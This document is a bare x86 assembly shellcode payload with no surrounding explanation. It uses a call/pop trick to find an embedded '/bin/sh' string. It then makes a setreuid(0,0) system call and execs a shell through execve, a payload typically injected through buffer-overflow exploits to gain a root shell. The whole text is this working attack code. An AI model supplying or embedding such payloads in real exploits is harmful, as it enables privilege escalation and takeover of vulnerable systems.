call hello
bye:
popl %ebx

movl $70, %eax
movl $0, %ebx
movl $0, %ecx
int $0x80

movl $0, %eax
movb %al, 7(%ebx)
movl %ebx, 8(%ebx)
movl %eax, 12(%ebx)

movl $11, %eax
leal 8(%ebx), %ecx
leal 12(%ebx), %edx
int $0x80

hello:
call bye
.string "/bin/shXAAAABBBB"
